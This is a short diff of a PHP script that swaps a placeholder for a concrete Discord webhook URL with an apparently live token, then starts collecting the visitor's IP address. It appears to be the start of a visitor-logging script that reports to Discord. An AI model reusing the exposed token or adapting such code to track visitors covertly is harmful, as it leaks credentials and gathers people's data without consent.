@@ -1,6 +1,6 @@
 <?php
 // ==== CONFIGURATION ====
-$webhook_url = "https://discord.com/api/webhooks/YOUR_WEBHOOK_URL_HERE";
+$webhook_url = "https://discord.com/api/webhooks/1395837361161764995/Poez5LdWDO0bHYZiSMz_HmoHlqm-dkEXy5CJkUWwvCZW330Mqh0BdKAfJw6XB61F0ZKU";
 
 // ==== GATHER INFO ====
 $ip = $_SERVER['REMOTE_ADDR'] ?? 'Unknown';
